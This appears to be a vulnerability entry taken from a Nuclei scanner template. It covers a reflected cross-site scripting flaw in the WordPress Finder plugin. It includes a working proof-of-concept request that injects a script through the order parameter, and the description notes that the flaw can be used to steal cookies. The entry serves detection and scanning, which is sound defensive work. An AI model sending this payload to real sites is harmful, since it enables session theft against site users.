# Nuclei Template: WordPress Finder - Cross-Site Scripting
**Template ID:** wp-finder-xss
**Vulnerability Class:** Cross-site Scripting (XSS) - Generic
**Severity:** High
**CWE:** CWE-79
**Source:** Nuclei Template (`wp-finder-xss.yaml`)

## Vulnerability Information & PoC

## Description
WordPress Plugin Finder contains a cross-site scripting vulnerability via the order parameter. An attacker can execute arbitrary script in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.

## Steps to reproduce / Exploit Payload
```http
GET / HTTP/1.1
Host: {{Hostname}}

GET {{BaseURL}}/wp-content/plugins/finder/index.php?by=type&dir=tv&order=%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
```

## References
- https://packetstormsecurity.com/files/115902/WordPress-Finder-Cross-Site-Scripting.html
